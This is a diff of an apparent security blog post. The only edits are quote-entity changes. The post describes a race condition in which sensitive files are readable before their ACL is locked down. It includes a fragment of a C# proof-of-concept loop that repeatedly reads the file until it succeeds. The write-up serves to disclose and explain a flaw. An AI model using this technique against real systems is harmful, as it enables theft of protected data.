@@ -135,7 +135,7 @@
 <li>Then the ACL is updated to lock down the file. <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.filesecurity?view=netframework-4.8">Here is a the documentation on how to do that using the FileSecurity class</a>.</li>
 </ul>
 <p>Hence, you might see <a href="https://docs.microsoft.com/en-us/dotnet/standard/io/how-to-add-or-remove-access-control-list-entries">something similar to the following lines:</a>:</p>
-<pre tabindex="0"><code>AddFileSecurity(filePath, @&quot;Administrators&quot;,
+<pre tabindex="0"><code>AddFileSecurity(filePath, @&#34;Administrators&#34;,
     FileSystemRights.ReadData, AccessControlType.Allow);
 </code></pre><p>Aditionally, <em>permission inheritance will be broken</em> by the developer as well (e.g to prevent automatic read access, as otherwise the file likely won&rsquo;t be locked down properly anyways).</p>
 <p><em>These two steps of (1) creating the widely exposed file with sensitive content and then (2) locking it down typically can be found right after each other in the source code.</em></p>
@@ -152,17 +152,17 @@
     {
         string content = File.ReadAllText(path);
 
-        Console.WriteLine(&quot;*** SUCCESS: File was grabbed before the ACL got applied! ***&quot;);
+        Console.WriteLine(&#34;*** SUCCESS: File was grabbed before the ACL got applied! ***&#34;);
         Console.WriteLine(content);
         break;
     }
     catch (Exception ex)
     {
-        //Console.Write(&quot;.&quot;); //provide feedback of access denied/file not found
+        //Console.Write(&#34;.&#34;); //provide feedback of access denied/file not found
     }
 }
 
-Console.WriteLine(&quot;*** Done&quot;);
+Console.WriteLine(&#34;*** Done&#34;);
 </code></pre><p>The name of the file would have to be known, or be predictable or otherwise retrievable by the attacker.</p>
 <h2 id="whats-the-result-you-might-ask">What&rsquo;s the result you might ask?</h2>
 <p><em>Turns out that this works about 100% of the time.</em>  I guess file IO is just really slow&hellip;</p>
